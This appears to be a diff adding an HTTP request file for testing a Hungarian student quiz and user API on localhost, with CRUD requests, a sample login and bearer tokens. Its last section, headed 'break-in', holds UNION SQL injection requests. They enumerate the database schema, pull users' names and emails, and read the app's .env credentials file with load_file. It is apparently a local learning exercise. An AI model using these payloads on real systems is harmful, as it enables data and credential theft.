@@ -1,0 +1,251 @@
+### login
+post http://localhost:3000/api/users/login
+Content-Type: application/json
+
+{
+    "email": "franyonorbi0@gmail.com",
+    "password": "testTest"
+}
+
+### Userek
+get http://localhost:3000/api/users
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NDkxNDQwMywiZXhwIjoxNjQ0OTE4MDAzfQ.HziYtxm6_7FDCIwLcupJVsE60purxD0Pu7Tib-o_lLA
+
+
+### Egy user
+get http://localhost:3000/api/users/1
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NDMxNTE5NCwiZXhwIjoxNjQ0MzE4Nzk0fQ.q2ih8UiVs51Pa3UEc908O6tLt5Upl9NOlidEmQSksMQ
+
+### User hozzáadása
+post http://localhost:3000/api/users
+Content-Type: application/json
+
+{
+    "firstName": "Norbert",
+    "lastName": "Franyó",
+    "gender": "Male",
+    "email": "franyonorbi0@gmail.com",
+    "password": "testTest",
+    "phoneNumber": 3333,
+    "access": 1
+}
+
+
+### Userek
+get http://localhost:3000/api/users
+
+### User módosítása
+put http://localhost:3000/api/users
+Content-Type: application/json
+
+{
+    "firstName": "Franyó",
+    "lastName": "Norbert",
+    "gender": "Male",
+    "email": "franyonorbi0@gmail.com",
+    "password": "testTest",
+    "phoneNumber": 33333,
+    "id": 1
+}
+
+### Delete user
+delete http://localhost:3000/api/users
+Content-Type: application/json
+
+{
+    "id": 2
+}
+
+
+### quiz
+
+### get quiz
+get http://localhost:3000/api/quiz
+Authorization: Bearer 
+
+### quizById
+get http://localhost:3000/api/quiz/2
+
+### Add quiz
+post http://localhost:3000/api/quiz
+Content-Type: application/json
+
+{
+    "quizName": "Test",
+    "Description": "TestDesc"
+}
+
+### quiz Update
+put http://localhost:3000/api/quiz
+Content-Type: application/json
+
+{
+    "quizName": "UpdatedQuiz2",
+    "Description": "This Quiz was Updated",
+    "id": 1
+}
+
+### Delete quiz
+delete http://localhost:3000/api/quiz
+Content-Type: application/json
+
+{
+    "id": 3
+}
+
+### get Question
+get http://localhost:3000/api/question
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTQ0NjI3MiwiZXhwIjoxNjQ1NDQ5ODcyfQ.mt6Ga598tVLQ3QXty4BF-amaU2Jbaww4U5z5AaUXvsg
+
+
+### QuestionById
+get http://localhost:3000/api/question/2
+Authorization: Bearer
+
+### Add question
+post http://localhost:3000/api/question
+Content-Type: application/json
+
+{ 
+    "question": "2+2=?", 
+    "categoryId": "1", 
+    "quizId": 1
+ }
+
+### question Update
+put http://localhost:3000/api/question
+Content-Type: application/json
+
+{
+    "question": "UpdatedQuestion",
+    "categoryId": "2",
+    "quizId": 1,
+    "id": 1
+}
+
+### Delete question
+delete http://localhost:3000/api/question
+Content-Type: application/json
+
+{
+    "id": 6
+}
+
+### Get Category
+get http://localhost:3000/api/category
+
+
+
+### New Category 
+post http://localhost:3000/api/category
+Content-Type: application/json
+
+{
+    "categoryName": "Test2"
+}
+### CategoryById
+get http://localhost:3000/api/category/3
+
+### Category Update
+put http://localhost:3000/api/category
+Content-Type: application/json
+
+{
+    "categoryName": "Test1",
+    "id": 5
+}
+
+### Delete Category
+delete http://localhost:3000/api/category
+Content-Type: application/json
+
+{
+    "id": 6
+}
+
+
+### Get QC
+get http://localhost:3000/api/QuestionChoice
+
+
+### QuestionChoice Create
+post http://localhost:3000/api/QuestionChoice
+Content-Type: application/json
+
+{
+    "choice": "TestQuestion",
+    "questionId": 3,
+    "points": 3
+}
+
+### Category Update
+put http://localhost:3000/api/QuestionChoice
+Content-Type: application/json
+
+{
+    "choice": "Test100",
+    "questionId": 3,
+    "points": 3,
+    "id": 10
+}
+
+### Delete QC
+delete http://localhost:3000/api/QuestionChoice
+Content-Type: application/json
+
+{
+    "id": 10
+}
+
+### QCById
+get http://localhost:3000/api/QuestionChoice/10
+
+
+
+### UA Create
+post http://localhost:3000/api/UserAnswers
+Content-Type: application/json
+
+{
+    "userId": 3,
+    "questionId": 3,
+    "questionChoiceId": 3,
+    "quizId": 2
+}
+
+### Get UA
+get http://localhost:3000/api/UserAnswers
+
+
+### UAById
+get http://localhost:3000/api/UserAnswers/3
+
+
+
+
+
+
+
+
+
+### Betörés
+### adatbázis lekérdezése
+get http://localhost:3000/api/carshrst/3100 union '', select database(), '', ''
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
+
+### táblák lekérdezése
+get http://localhost:3000/api/carshrst/3100 union select '', '', '',table_name from information_schema.tables where table_schema='my_auth'
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
+
+### users táblában milyen oszlopok típussal
+get http://localhost:3000/api/carshrst/3100 union select data_type, '', '', column_name from information_schema.columns where table_name='registration'
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
+
+
+### users tábla adatainak kilopása
+get http://localhost:3000/api/carshrst/3100 union select gender, firstName, lastName, email from registration
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NDMxNTE5NCwiZXhwIjoxNjQ0MzE4Nzk0fQ.q2ih8UiVs51Pa3UEc908O6tLt5Upl9NOlidEmQSksMQ
+
+### Adatbázis hozzáférés kilopása
+get http://localhost:3000/api/carshrst/3100 union select '', load_file('D:\\zzz\\authWithMysql\\.env') file, '','';
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUxMDA0MywiZXhwIjoxNjQ1NTEzNjQzfQ.m8wv5Wszpc-nPeHFB4FrU_va1C5ZVPYvMEbD4mYL92U
